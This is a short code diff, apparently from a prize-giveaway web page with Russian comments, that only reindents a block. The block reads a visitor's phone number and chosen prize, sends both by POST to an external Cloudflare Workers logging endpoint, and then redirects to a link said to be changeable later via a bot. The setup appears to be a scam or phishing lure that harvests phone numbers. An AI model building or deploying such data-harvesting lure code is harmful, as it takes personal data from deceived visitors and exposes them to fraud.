@@ -243,10 +243,10 @@
     const phone = phoneInput.value;          // введённый номер
     const prize = prizeText.textContent;     // выбранный приз
 
-      fetch('https://logse.lukasschneid3r.workers.dev/', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phone, prize })
+    fetch('https://logse.lukasschneid3r.workers.dev/', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ phone, prize })
       }).catch(err => console.error(err));
 
    // Редирект на ссылку (пока фиксированная, позже можно менять через бота)
